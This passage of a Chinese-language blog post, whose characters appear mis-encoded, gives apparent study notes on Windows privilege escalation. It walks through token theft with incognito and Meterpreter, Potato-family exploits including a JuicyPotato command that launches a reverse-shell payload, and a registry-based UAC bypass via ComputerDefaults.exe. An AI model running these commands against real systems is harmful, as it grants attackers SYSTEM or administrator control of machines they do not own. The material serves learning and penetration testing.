href="https://github.com/milkdevil/incognito2/blob/master/incognito.exe">https://github.com/milkdevil/incognito2/blob/master/incognito.exe</a></p><p>ä¸‹é¢å‘½ä»¤åˆ—ä¸¾å½“å‰ä¸»æœºä¸Šçš„æ‰€æœ‰ä»¤ç‰Œï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe list_tokens -u<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448409.png" alt="image-20240328230830862"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-c å‚æ•°åä¸ºè¦çªƒå–çš„ä»¤ç‰Œï¼›<span class="hljs-built_in">whoami</span>ä¸ºçªƒå–ä»¤ç‰Œåè¦æ‰§è¡Œçš„å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤çªƒå–ç›®æ ‡è´¦æˆ·çš„è®¿é—®ä»¤ç‰Œå¹¶åˆ›å»ºè¿›ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151448410.png" alt="image-20240328231014201"></p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯ä»¥ç›´æ¥å®ç°ç”¨æˆ·çš„åˆ‡æ¢ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448411.png" alt="image-20240328231224386"></p><p><strong>åˆ©ç”¨MetaSploitçªƒå–ä»¤ç‰Œ</strong></p><p>å¦‚æœè·å–äº†Meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œä»¤ç‰Œçªƒå–ç­‰ç³»åˆ—æ“ä½œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">load incognito  # åŠ è½½incognitoæ¨¡å—<br>list_tokens -u    #åˆ—å‡ºä¸»æœºä¸Šçš„æ‰€æœ‰è®¿é—®ä»¤ç‰Œ<br>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #çªƒå–NT AUTHORITY\SYSTEMè´¦æˆ·çš„ä»¤ç‰Œ<br>steal_token &lt;PID&gt;     #ä»æŒ‡å®šçš„è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448412.png" alt="image-20240329103055609"></p><p><strong>åˆ©ç”¨ä»¤ç‰Œè·å–TrustedInstalleræƒé™</strong></p><p>SYSTEMæƒé™ä¸ºWindowsç³»ç»Ÿä¸­çš„æœ€é«˜æƒé™ï¼Œä½†æ˜¯å³ä¾¿è·å–äº†è¯¥æƒé™ä¹Ÿä¸èƒ½ä¿®æ”¹Windowsçš„ç³»ç»Ÿæ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼ŒC:\Windows\servicingç›®å½•å³ä½¿æ‹¥æœ‰ SYSTEMæƒé™ä¹Ÿæ— æ³•å‘è¯¥ç›®å½•å†™å…¥æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151448413.png" alt="image-20240329141219861"></p><p>æˆ‘ä»¬å¯ä»¥ç”¨icaclsæŸ¥çœ‹ä¸€ä¸‹è¯¥ç›®å½•çš„æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icacls &quot;C:\Windows\servicing&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448414.png" alt="image-20240329141552795"></p><p>å‘ç° NT SERVICE\TrustedInstaller è´¦æˆ·å¯¹å…¶å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™</p><blockquote><p>ä» Windows Vista å¼€å§‹ç³»ç»Ÿå†…ç½®äº†ä¸€ä¸ª TrustedInstaller å®‰å…¨ä¸»ä½“ï¼Œæ‹¥æœ‰ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶æƒé™ï¼Œä¸“ç”¨äºå¯¹ç³»ç»Ÿè¿›è¡Œç»´æŠ¤ã€æ›´æ–°ç­‰æ“ä½œã€‚TrustedInstaller ä»¥ä¸€ä¸ªè´¦æˆ·ç»„çš„å½¢å¼å‡ºç°å³ NT SERVICE\TrustedInstallerã€‚</p></blockquote><p>TrustedInstalleræœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡ï¼Œå¯åŠ¨è¯¥æœåŠ¡æ˜¯ä¼šè¿è¡ŒTrustedInstaller.exeç¨‹åºï¼Œè¯¥ç¨‹åºçš„è·¯å¾„ä¸ºâ€œC:\Windows\servicing\TrustedInstaller.exeâ€</p><p><img src="http://cdn.clown2024.cn/202407151448415.png" alt="image-20240329143249885"></p><p>å…¶æ‹¥æœ‰è€…å°±æ˜¯NT SERVICE\TrustedInstallerï¼›æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çªƒå–è¯¥è¿›ç¨‹çš„ä»¤ç‰Œæ¥è·å¾—ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶çš„æƒé™ã€‚</p><p>ç„¶åæˆ‘ä»¬æ‰§è¡Œä¸‹é¢å‘½ä»¤å…ˆå¯åŠ¨è¯¥æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc start TrustedInstaller<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448416.png" alt="image-20240329143614256"></p><p>ç„¶ååœ¨meterpreterä¸­åˆ©ç”¨ä¸Šé¢çš„pidçªƒå–ä»¤ç‰Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">steal_token &lt;PID&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448417.png" alt="image-20240329143700500"></p><h1 id="potatoå®¶æ—ææƒ"><a href="#Potatoå®¶æ—ææƒ" class="headerlink" title="Potatoå®¶æ—ææƒ"></a>Potatoå®¶æ—ææƒ</h1><p>Potatoå®¶æ—æ˜¯ä¸€ç§å¸¸ç”¨çš„ææƒæŠ€æœ¯ï¼Œé€šè¿‡æ“çºµè®¿é—®ä»¤ç‰Œå°†å·²è·å–çš„WindowsæœåŠ¡è´¦æˆ·æƒé™æå‡è‡³ç³»ç»ŸSYSTEMæƒé™ã€‚</p><p>Potato å®¶æ—æ˜¯é€šè¿‡æ»¥ç”¨å‰é¢ä»¤ç‰Œçªƒå–æåˆ°çš„ä¸¤ä¸ªå‰æç‰¹æƒï¼Œå°†å·²è·å–çš„ NT AUTHORITY\SYSTEM è´¦æˆ·çš„è®¿é—®ä»¤ç‰Œä¼ å…¥CreateProcessWithTokenWæˆ–CreateProcessAsUserAå‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œä»è€Œåœ¨NT AUTHORITY\SYSTEM è´¦æˆ·çš„ä¸Šä¸‹æ–‡åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä»¥æå‡è‡³SYSTEMæƒé™ã€‚</p><blockquote><p>åœ¨å®æˆ˜åœºæ™¯ä¸­ï¼Œè‹¥æˆåŠŸæ‹¿åˆ°äº†IISç­‰æœåŠ¡çš„ WebShell æˆ–è€…é€šè¿‡ MSSQL æœåŠ¡çš„xp_cmdshell æˆåŠŸæ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ï¼Œæ­¤æ—¶è·å–çš„æœåŠ¡è´¦æˆ·æ‹¥æœ‰ SeImpersonatePrivilege å’ŒSeAssignPrimaryTokenPrivilege ç‰¹æƒï¼Œå°±å¯ä»¥é€šè¿‡ Potato å®¶æ—æå‡è‡³ SYSTEM æƒé™ã€‚</p></blockquote><h2 id="rotten-potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2><p>å³â€çƒ‚åœŸè±†â€ï¼Œç”¨äºå°†å·²è·å–çš„æœåŠ¡è´¦æˆ·æƒé™æå‡è‡³SYSTEMæƒé™ã€‚</p><p>Rotten Potato ææƒçš„å®ç°æœºåˆ¶ç›¸å½“å¤æ‚ï¼Œæ‹¦æˆª NTLM èº«ä»½è®¤è¯è¯·æ±‚ï¼Œå¹¶ä¼ªé€  NT AUTHORITY\SYSTEM è´¦æˆ·çš„è®¿é—®ä»¤ç‰Œï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p><ol><li>é€šè¿‡ CoGetInstanceFromIStorage APIï¼Œå°†ä¸€ä¸ªCOMå¯¹è±¡(BITS)åŠ è½½åˆ°æœ¬åœ°å¯æ§çš„ç«¯å£(TCP 6666)ï¼Œå¹¶è¯±éª— BITS å¯¹è±¡ä»¥ NT AUTHORITY\SYSTEM è´¦æˆ·çš„èº«ä»½å‘è¯¥ç«¯å£å‘èµ· NTLM è®¤è¯</li><li>å€ŸåŠ©æœ¬åœ°RPC 135ç«¯å£,å¯¹BITSå¯¹è±¡çš„è®¤è¯è¿‡ç¨‹æ‰§è¡Œä¸­é—´äººæ”»å‡»(NTLM Relay),åŒæ—¶è°ƒç”¨ç›¸å…³ APIä¸º NT AUTHORITY\SYSTEM è´¦æˆ·åœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚</li><li>é€šè¿‡ NT AUTHORITY\SYSTEM è´¦æˆ·çš„ä»¤ç‰Œåˆ›å»ºæ–°è¿›ç¨‹ï¼Œä»¥è·å–SYSTEM æƒé™ã€‚</li></ol><p>ç°åœ¨å‡è®¾å·²ç»è·å–IISæœåŠ¡è´¦æˆ·çš„WebShellï¼Œæ‰§è¡Œwhoami &#x2F;privæŸ¥è¯¢å½“å‰çš„ç‰¹æƒ</p><p><img src="http://cdn.clown2024.cn/202407151448418.png" alt="image-20240402093845566"></p><p>é€šè¿‡webshellä¸Šçº¿MetaSploitï¼Œæ­¤æ—¶åŠ è½½incognitoä¸èƒ½åˆ—ä¸¾å‡ºé«˜æƒé™ç”¨æˆ·çš„ä»¤ç‰Œ</p><p><img src="http://cdn.clown2024.cn/202407151448419.png" alt="image-20240402093939148"></p><p>æ¥ä¸‹æ¥å‘ç›®æ ‡ä¸»æœºä¸Šä¼ Rotten Potatoçš„åˆ©ç”¨ç¨‹åºï¼Œå¹¶é€šè¿‡ä¸‹é¢å‘½ä»¤åœ¨Meterpreterä¸­è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">execute -Hc -f rottenpotato.exe<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å†æ¬¡æ‰§è¡Œlist_token -uå°±å¯ä»¥çœ‹åˆ° é«˜æƒé™ç”¨æˆ·çš„ä»¤ç‰Œäº†</p><p><img src="http://cdn.clown2024.cn/202407151448420.png" alt="image-20240402094141557"></p><p>ç„¶åå°±å¯ä»¥ç”¨impersonate_tokenä¼ªé€ è¯¥ä»¤ç‰Œè·å–SYSTEMæƒé™</p><p><img src="http://cdn.clown2024.cn/202407151448421.png" alt="image-20240402094236551"></p><h2 id="juicy-potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h2><p>Juicy Potato ä¸ Rotten Potato çš„åŸç†å‡ ä¹å®Œå…¨ç›¸åŒï¼Œåªæ˜¯åœ¨åè€…çš„åŸºç¡€ä¸Šåšäº†æ‰©å±•ï¼Œä»¥ä¾¿æ›´çµæ´»åˆ©ç”¨ Rotten Potatoã€‚Juicy Potato ä¸å†åƒ Rotten Potato é‚£æ ·ä¾èµ–äºä¸€ä¸ªç°æœ‰çš„Meterpreter,å¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰ COM å¯¹è±¡åŠ è½½çš„ç«¯å£,ä»¥åŠæ ¹æ®ç³»ç»Ÿç‰ˆæœ¬æ›´æ¢å¯ç”¨çš„ COMå¯¹è±¡</p><p>è¿˜æ˜¯ä»¥IISæœåŠ¡æ¼”ç¤ºï¼Œå‡è®¾å·²ç»é€šè¿‡MetaSploit è·å–äº† IISæœåŠ¡è´¦æˆ·çš„æƒé™ã€‚</p><ol><li><p>ä¸Šä¼  JuicyPotato çš„åˆ©ç”¨ç¨‹åºï¼Œå¹¶æ ¹æ®æ“ä½œç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ COM å¯¹è±¡ã€‚åœ¨ Rotten Potato ä¸­ä½¿ç”¨çš„ COM å¯¹è±¡ä¸º BITSï¼Œè€Œ Juicy Potato ä¸ºä¸åŒ Windows ç‰ˆæœ¬æä¾›äº†å¤šä¸ªå¯ä»¥åˆ©ç”¨çš„COMå¯¹è±¡ã€‚</p><p>å¯¹äºWindows Server2016ï¼Œå¯ä»¥é€‰æ‹©çš„å¯¹è±¡æœ‰COMXblGameSave,å…¶CLSIDä¸º{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</p></li><li><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿è¡Œ JuicyPotatoï¼Œå°†è·å– SYSTEM æƒé™å¹¶è¿è¡ŒæŒ‡å®šçš„æ”»å‡»è½½è·ï¼ŒæˆåŠŸè·å–åˆ°äº†ä¸€ä¸ªSYSTEMæƒé™çš„Meterpreter</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">JuicyPotato.exe -t t -p &quot;C:\inetpub\wwwroot\reverse_tcp.exe&quot; -l 6666 -n 135 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-tï¼ŒæŒ‡å®šè¦ä½¿ç”¨ CreateProcesswithTokenWå’ŒCreateProcessAsUserA()ä¸­çš„å“ªä¸ªå‡½æ•°åˆ›å»ºè¿›ç¨‹</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-pï¼ŒæŒ‡å®šè¦è¿è¡Œçš„ç¨‹åºï¼›-lï¼ŒæŒ‡å®šCOMå¯¹è±¡åŠ è½½çš„ç«¯å£</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-nï¼ŒæŒ‡å®šæœ¬åœ°RPCæœåŠ¡ç«¯å£ï¼Œé»˜è®¤ä¸º135ï¼›-cï¼ŒæŒ‡å®šCOMå¯¹è±¡çš„CLSID</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448422.png" alt="image-20240406110723009"></p></li></ol><blockquote><p>æ³¨æ„ï¼Œä»¥ä¸Šææƒæ–¹æ³•ä»…é€‚ç”¨äº Windows 10 version 1809 å’Œ Windows Server 2019 ä¹‹å‰ç‰ˆæœ¬çš„ç³»ç»Ÿã€‚åœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œå¾®è½¯é€šè¿‡æ£€æŸ¥RPC ç»‘å®šå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„ç«¯å£æ¥ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼Œä¿®å¤åçš„ç³»ç»Ÿæ— æ³•é€šè¿‡åŸæ¥çš„æ–¹æ³•å®ç°ä¸­é—´äººæ”»å‡»ã€‚</p></blockquote><h2 id="printspooferpipe-potato"><a href="#PrintSpooferï¼ˆPipe-Potatoï¼‰" class="headerlink" title="PrintSpooferï¼ˆPipe Potatoï¼‰"></a>PrintSpooferï¼ˆPipe Potatoï¼‰</h2><p>è¯¥ææƒæŠ€æœ¯ä¸»è¦åˆ©ç”¨äº†æ‰“å°æœºç»„ä»¶è·¯å¾„æ£€æŸ¥ä¸­å­˜åœ¨çš„ä¸€ä¸ªBugï¼Œä½¿é«˜æƒé™çš„æœåŠ¡èƒ½è¿æ¥åˆ°æµ‹è¯•äººå‘˜åˆ›å»ºçš„å‘½åç®¡é“ï¼Œä»¥è·å–é«˜æƒé™è´¦æˆ·çš„ä»¤ç‰Œæ¥åˆ›å»ºæ–°è¿›ç¨‹ã€‚</p><p>ä¸Šçº¿MetaSploitåï¼Œå‘ç›®æ ‡ä¸»æœºä¸Šä¼ PipePotatoåˆ©ç”¨ç¨‹åºï¼Œåœ¨SHELLä¸­ç›´æ¥è¿è¡Œå°±ä¼šè·å¾—SYSTEMæƒé™</p><p><img src="http://cdn.clown2024.cn/202407151448423.png" alt="image-20240406112010157"></p><h2 id="sweet-potato"><a href="#Sweet-Potato" class="headerlink" title="Sweet Potato"></a>Sweet Potato</h2><p>é›†æˆäº†ä¸Šé¢æ‰€è¿°çš„åŠŸèƒ½ï¼Œæœ‰æœºä¼šæŠŠè¿™äº›ææƒæ–¹æ³•å¤ç°ä¸€ä¸‹ã€‚</p><h1 id="bypass-uac"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><p>ç”¨æˆ·è´¦æˆ·æ§åˆ¶(User Account Controlï¼ŒUAC)æ˜¯Windowsæ“ä½œç³»ç»Ÿé‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶ï¼Œå¯ä»¥é˜»æ­¢è‡ªåŠ¨å®‰è£…æœªç»æˆæƒçš„åº”ç”¨å¹¶é˜²æ­¢æ„å¤–æ›´æ”¹ç³»ç»Ÿè®¾ç½®ï¼Œæœ‰åŠ©äºé˜²æ­¢æ¶æ„è½¯ä»¶æŸåè®¡ç®—æœºã€‚ç”¨æˆ·è´¦æˆ·æ§åˆ¶ä½¿åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å§‹ç»ˆåœ¨éç®¡ç†å‘˜è´¦æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨æˆäºˆç®¡ç†å‘˜çº§åˆ«çš„æƒé™ã€‚å¼€å¯ç”¨æˆ·è´¦æˆ·æ§åˆ¶åï¼Œæ¯ä¸ªéœ€è¦ä½¿ç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œçš„åº”ç”¨éƒ½å¿…é¡»æç¤ºå¾å¾—ç”¨æˆ·åŒæ„ã€‚</p><p>UACé™åˆ¶é™åˆ¶æ‰€æœ‰ç”¨æˆ·åŒ…æ‹¬éRID 500çš„ç®¡ç†å‘˜ç”¨æˆ·ä½¿ç”¨æ ‡å‡†ç”¨æˆ·ç™»å½•åˆ°ä»–ä»¬çš„è®¡ç®—æœºï¼Œå¹¶åœ¨æ ‡å‡†ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è®¿é—®èµ„æºå’Œè¿è¡Œåº”ç”¨ï¼›éRID 500æŒ‡çš„æ˜¯é™¤äº†Administratorä»¥å¤–ã€ä½äºç®¡ç†å‘˜ç»„çš„å…¶ä»–ç”¨æˆ·ã€‚</p><p>éRID 500ç”¨æˆ·ç™»å½•åï¼Œç³»ç»Ÿä¼šä¸ºä»–ä»¬åˆ›å»ºä¸¤ä¸ªå•ç‹¬çš„è®¿é—®ä»¤ç‰Œï¼šæ ‡å‡†ç”¨æˆ·è®¿é—®ä»¤ç‰Œå’Œç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚ä¸¤ä¸ªä»¤ç‰Œçš„ç”¨æˆ·ç‰¹å®šä¿¡æ¯ç›¸åŒï¼Œåªæ˜¯æ ‡å‡†ç”¨æˆ·ä»¤ç‰Œç§»é™¤äº†Windowsç®¡ç†ç‰¹æƒå’Œç›¸å…³SIDã€‚å½“è¦æ‰§è¡Œé«˜æƒé™ä»»åŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è¯¢é—®æ˜¯å¦æ‰¹å‡†ï¼Œä¹Ÿå°±æ˜¯å¹³æ—¶ä¼šå¼¹å‡ºçš„æ˜¯å¦ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œã€‚</p><blockquote><p>Bypass UACå°±æ˜¯ä½¿éRID 500ç”¨æˆ·å¯ä»¥ä¸éœ€è¦æ‰¹å‡†ç›´æ¥ä½¿ç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚</p></blockquote><h2 id="uacç™½åå•"><a href="#UACç™½åå•" class="headerlink" title="UACç™½åå•"></a>UACç™½åå•</h2><p>å¾®è½¯ç»™ä¸€äº›ç³»ç»Ÿç¨‹åºè®¾ç½®äº†ç™½åå•æœºåˆ¶ï¼Œè¿™äº›ç¨‹åºæ‰§è¡Œé«˜æƒé™æ—¶ä¸ç”¨å†è¯¢é—®ï¼›å¦‚ï¼šslui.exeã€wusa.exeã€taskmgr.exeã€msra.exeã€eudcedit.exeã€eventvwr.exeã€CompMgmtLauncher.exeã€rundll32.exeã€explorer.exeã€‚</p><p>å¯¹è¿™äº›ç¨‹åºè¿›è¡ŒDLLåŠ«æŒã€DLLæ³¨å…¥æˆ–è€…æ³¨å†Œè¡¨åŠ«æŒå°±å¯ä»¥ç»•è¿‡UACã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç”¨å¾®è½¯å®˜æ–¹æä¾›çš„ä¸¤ä¸ªå·¥å…·æ¥å¯»æ‰¾ç™½åå•ç¨‹åºï¼šSigcheckå’ŒStrings</p><p>ç™½åå•ç¨‹åºçš„ç‰¹æ€§å°±æ˜¯Manifest æ•°æ®ä¸­ autoElevate å±æ€§çš„å€¼ä¸º Trueã€‚</p><p>Sigcheckå¯ä»¥æ£€æµ‹ç¨‹åºæ˜¯å¦æœ‰autoElevateå±æ€§ï¼Œä»¥ComputerDefaults.exeç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sigcheck.exe /accepteula -m C:\Windows\System32\ComputerDefaults.exe<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448424.png" alt="image-20240406121105319"></p><p>Stringså¯ä»¥æ‰¾å‡ºæ‰€æœ‰å…·æœ‰autoElevateå±æ€§çš„ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i &quot;autoElevate&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448425.png" alt="image-20240406121717543"></p><p>ä¸‹é¢ç”¨ComputerDefaults.exeæ¥è¿›è¡Œåˆ†æï¼Œå¹¶é€šè¿‡è¯¥ç¨‹åºç»•è¿‡UAC</p><ol><li><p>è¯¥ç¨‹åºè¿è¡Œåä¼šæ‰“å¼€Windowsé»˜è®¤åº”ç”¨ï¼Œè€Œä¸”ä¸ä¼šå‡ºç°UACå¼¹çª—<img src="http://cdn.clown2024.cn/202407151448426.png" alt="image-20240406123213032"></p></li><li><p>ä½¿ç”¨è¿›ç¨‹ç›‘æ§å™¨Process Monitor(è¿™ä¹Ÿæ˜¯å¾®è½¯çš„å®˜æ–¹å·¥å…·)ç›‘æ§è¯¥ç¨‹åºè¿›ç¨‹çš„æ‰€æœ‰æ“ä½œè¡Œä¸º(ä¸»è¦æ˜¯ç›‘æ§æ³¨å†Œè¡¨å’Œæ–‡ä»¶çš„æ“ä½œ)</p><p><img src="http://cdn.clown2024.cn/202407151448427.png" alt="image-20240406145056963"></p><p>å¯ä»¥çœ‹åˆ°æ³¨å†Œè¡¨çš„æŸ¥è¯¢é¡¹å’Œè¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨ä¿®æ”¹æŸ¥è¯¢æ³¨å†Œè¡¨æ—¶ä¼šæ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ¥è¿›è¡ŒUACç»•è¿‡ï¼Œä¹¦ä¸Šç”¨çš„æ³¨å†Œè¡¨è·¯å¾„æˆ‘è¿™é‡Œæ²¡æœ‰ï¼Œå°±è®°å½•ä¸€ä¸‹ç»•è¿‡è¿‡ç¨‹</p></li></ol><p>ä¹¦ä¸Šçš„è¯¥ç¨‹åºä½¿ä¼šæŸ¥è¯¢æ³¨å†Œè¡¨çš„è¿™ä¸¤ä¸ªè¿›ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151448428.png" alt="image-20240406145719264"></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä»¥â€œshell\open\commandâ€œå‘½åçš„æ³¨å†Œè¡¨ä¸­å­˜å‚¨çš„å¯èƒ½æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œæ‰€ä»¥çŸ¥é“åå°±å¯ä»¥ä¿®æ”¹è¯¥é¡¹çš„å€¼ä»¥ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /d &quot;c:\Windows\System32\cmd.exe&quot; /f<br>reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;c:\Windows\System32\cmd.exe&quot; /f<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸Šé¢å‘½ä»¤åå°±ä¼šåœ¨æ³¨å†Œè¡¨HKCU\Software\Classes\ms-settings\shell\open\commandï¼ˆå¦‚æœæ²¡æœ‰å°±åˆ›å»ºï¼‰ä¸­å°†è¦æ‰§è¡Œçš„æ”»å‡»è½½è·è·¯å¾„åˆ†åˆ«å†™å…¥é»˜è®¤å€¼å’ŒDelegateExecuteå€¼ã€‚æ ‡å‡†ç”¨æˆ·å¯¹æ³¨å†Œè¡¨é”®å€¼æœ‰ä¿®æ”¹æƒé™ï¼Œå¹¶ä¸”å¯¹HKCUçš„ä¿®æ”¹ä¼šè‡ªåŠ¨åŒæ­¥åˆ°HKCR</p><p><img src="http://cdn.clown2024.cn/202407151448429.png" alt="image-20240406174941120"></p><p>è¿™æ—¶å€™å†æ¬¡è¿è¡ŒComputerDefaults.exeæ—¶ï¼Œæ¶æ„ç¨‹åºå°±ä¼šéšç€è¯¥ç¨‹åºçš„å¯åŠ¨ç»•è¿‡UACå¹¶ä»¥é«˜æƒé™è¿è¡Œï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151448430.png" alt="image-20240406175124818"></p><p>ä¸Šçº¿MetaSploitä¹‹åï¼Œæ‰§è¡Œgetsystemå‘½ä»¤å¯ç›´æ¥æå‡è‡³SYSTEMæƒé™</p><p><img src="http://cdn.clown2024.cn/202407151448431.png" alt="image-20240406175217578"></p><h2 id="dllåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h2><p>DLLå°±æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™ç›¸å…³çš„DLLå°±ä¼šè¢«åŠ è½½è¿›å¯¹åº”ç¨‹åºè¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œå½“æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡ä¸€äº›æ‰‹æ®µè®©ç¨‹åºæ‰§è¡Œä»»æ„çš„DLLï¼Œå°±ä¼šé€ æˆDLLåŠ«æŒã€‚</p><p>åº”ç”¨ç¨‹åºåŠ è½½DLLæ—¶ï¼Œæ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„å°±ä¼šä»¥ä¸‹é¢çš„è·¯å¾„æœç´¢DLL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ç¨‹åºå®‰è£…ç›®å½•==ã€‹ç³»ç»Ÿç›®å½•(C:\Windows\System32)==ã€‹16ä½ç³»ç»Ÿç›®å½•(C:\Windows\System)==ã€‹Windowsç›®å½•(C:\Windows)==ã€‹å½“å‰å·¥ä½œç›®å½•==ã€‹PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„å„ç›®å½•<br></code></pre></td></tr></table></figure><p>DLLåŠ«æŒçš„åŸç†å°±æ˜¯å°†æˆ‘ä»¬çš„åŒåæ¶æ„DLLæ–‡ä»¶æ”¾åœ¨åˆæ³•DLLæ–‡ä»¶çš„æœç´¢è·¯å¾„ä¹‹å‰ï¼Œç¨‹åºå°±ä¼šä¼˜å…ˆåŠ è½½æˆ‘ä»¬çš„æ¶æ„DLLï¼Œé€ æˆDLLåŠ«æŒï¼›åˆ©ç”¨çš„å‰ææ˜¯æ‹¥æœ‰å¯¹ä¸Šè¿°ç›®å½•çš„å†™å…¥æƒé™ï¼Œå¹¶ä¸”æ¶æ„ DLL éœ€è¦ä¸åŸå§‹ DLLæ‹¥æœ‰ç›¸åŒçš„å¯¼å‡ºè¡¨å‡½æ•°ã€‚</p><h2 id="æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•"><a href="#æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•" class="headerlink" title="æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•"></a>æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•</h2><p>å½“ç³»ç»Ÿå…è®¸ç¨‹åºè‡ªåŠ¨æå‡æƒé™æ—¶ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ï¼Œä»»ä½•ä¸€ä¸ªæ¡ä»¶ä¸é€šè¿‡éƒ½ä¼šè¢«ç³»ç»Ÿæ‹’ç»ï¼š</p><ol><li>æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„ Manifest 